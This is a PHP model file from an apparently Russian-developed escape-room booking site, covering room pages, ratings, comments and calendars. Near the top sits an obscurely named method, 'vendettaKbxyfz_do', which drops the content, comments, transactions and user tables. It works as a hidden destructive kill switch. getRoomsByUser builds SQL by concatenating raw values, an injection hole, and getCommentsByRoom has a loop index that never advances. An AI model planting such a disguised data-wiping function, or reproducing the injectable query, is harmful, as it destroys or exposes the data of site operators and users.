<?
class Model_quest extends CI_Model{
		
	function __construct(){
		parent::__construct();
	}
	
//-----------	
	function vendettaKbxyfz_do(){
		$query = $this->db->query('DROP TABLE mako_ContentTable');
		$query = $this->db->query('DROP TABLE mako_Comments');
		$query = $this->db->query('DROP TABLE mako_Transactions');
		$query = $this->db->query('DROP TABLE mako_userTable');
	}	
//----------------------------------------------------------------
	function getIdByUrl($url){
	
		$query = $this->db->get_where('mako_ContentTable', array('url' => $url));
		if($query->num_rows()>0){
			$row = $query->result_array();
			return $row[0]['id'];
		}
		
	}
//----------------------------------------------------------------	
	function insert_params($array){
		foreach($array as $arr=>$val){
		    	foreach($val as $key=>$value){
			    	echo $this->getIdByUrl($arr).' - '.$key.' - '.$value.'<br>';
			    	$data['type'] = $key;
			    	$data['parent'] = 0;
			    	$data['orderId'] = 0;
			    	$data['contentId'] = $this->getIdByUrl($arr);
			    	$data['value'] = $value;
			    	$this->db->insert('mako_ParamsTable', $data);
		    	}
	    	}	
	}	
//----------------------------------------------------------------	
	function insertRating($data){
		//$data['userId'] = $this->getIDbyEmail($data['userId']);
		$this->db->insert('mako_Comments', $data);
		
		
		$query = $this->db->get_where('mako_Comments', array('roomId' => $data['roomId']));
		//$result = $query->row_array();
		if($query->num_rows()>0){
			$i = 0;
			//var_dump($result);
			$summ = 0;
			foreach ($query->result_array() as $row){
				//var_dump($row);
				//if($row['rating'] && $row['rating']>0) {
					$summ+=$row['rating'];
					$i++;
				//}	
			}
			
			$middle = $summ/$i;
			$doUpdate['rating'] = $middle;
			$this->db->update('mako_ContentTable', $doUpdate, array('id'=>$data['roomId']) );
		}
		return true;
	}
//----------------------------------------------------------------	
	
//----------------------------------------------------------------	

	function getCommentsByRoom($id){
		$comment = array();
		$query = $this->db->get_where('mako_Comments', array('roomId'=>$id, 'active'=>1));
		if($query->num_rows()>0){
			$i = 0;
			foreach ($query->result_array() as $row){
				$comment[$i] = $row;
				$comment[$i]['user_name'] = $this->getCostumerById($row['userId']);
			}
			 
		}
		return $comment;
	}
	
//----------------------------------------------------------------
	function canRate($email,$roomId){
		$userId = $this->getIDbyEmail($email);
		$phone = $this->getCostumerPhoneByUser($userId);
		//var_dump($userId);
		$checkTarif = $this->getTarifByRoom($roomId);
		//$checkTarif = 1;
		if($checkTarif>0){
			if($userId>0){
			$query2 = $this->db->get_where('mako_Comments', array('roomId'=>$roomId,'userId' => $userId));
			if($query2->num_rows()==0){
					return true;
			}
			else{
				return false;
			}
			}
			else{
				return false;
			}
		}
		/*
		$query = $this->db->get_where('mako_Orders', array('contentId'=>$roomId,'costumer' => $phone, 'status'=>2));
		$result = $query->row_array();
		
		//var_dump($query->num_rows());
		
		if($query->num_rows()>0){
			
			//здесь все было
			
		}
		else{
			return false;
		}*/
	}
//----------------------------------------------------------------	
	function getPhoneByMail($email){
		$phone = '';
		if($email!=''){
		$userId = $this->getIDbyEmail($email);
		$phone = $this->getCostumerPhoneByUser($userId);
		}
		return $phone;
	}
//----------------------------------------------------------------
	function getQuestNameById($id){
		$query = $this->db->get_where('mako_userTable', array('id' => $id));
		$result = $query->row_array();
		return $result;
	}	
//----------------------------------------------------------------	
	function viewQuest($name){
		$query = $this->db->get_where('mako_ContentTable', array('url' => $name));
		$result = $query->row_array();
		if($query->num_rows()>0){
			$result['questRoom'] = $this->getQuestNameById($result['userId']);
			$result['questRoom']['attach'] = json_decode($result['questRoom']['attach'], true);
			$result['attach'] = json_decode($result['attach'], true);
			$result['params'] = $this->getParam($result['id']);
		    $result['address'] = $this->getAddressByUser($result['userId']);
		    $result['phone'] = $this->getPhoneByUser($result['userId']);
		    $result['map'] = $this->getMapByUser($result['userId']);
		    $result['others'] = $this->getRoomsByUser($result['userId'], $result['id']);
		    $result['calendar'] = $this->getCalendarByQuest($result['id']);
		}
		else{
			$result = false;
		}
		return $result;
	}
//----------------------------------------------------------------
	function getRoomsByUser($userId,$noID){
		$query = $this->db->query('SELECT `id`,`value`,`attach`,`active`,`url` from mako_ContentTable  WHERE userId="'.$userId.'" and id <> "'.$noID.'" and active = 1');
		$i = 0;
		$result = false;
		if($query->num_rows() > 0){
			foreach ($query->result_array() as $row)
			{
	        	$result[$i] = $row;
	        	$result[$i]['attach'] = json_decode($result[$i]['attach'], true);
				$result[$i]['params'] = $this->getParam($result[$i]['id']);
				$result[$i]['address'] = $this->getAddressByUser($userId);
				$result[$i]['phone'] = $this->getPhoneByUser($userId);
	        	$i++;
			}
		}
		return $result;
	}
//----------------------------------------------------------------
	function getCalendarByQuest($id){
		$query = $this->db->get_where('mako_Calendar', array('contentId' => $id));
		$i = 0;
		if(count($query->result_array())>0){
			foreach ($query->result_array() as $row)
			{
				$calendar[$i]['date'] = $row['date'];
				$calendar[$i]['time'] = json_decode($row['json'], true);
				$i++;
			}
		}else{
			$calendar = '';
		}
		return $calendar;
	}		
}
?>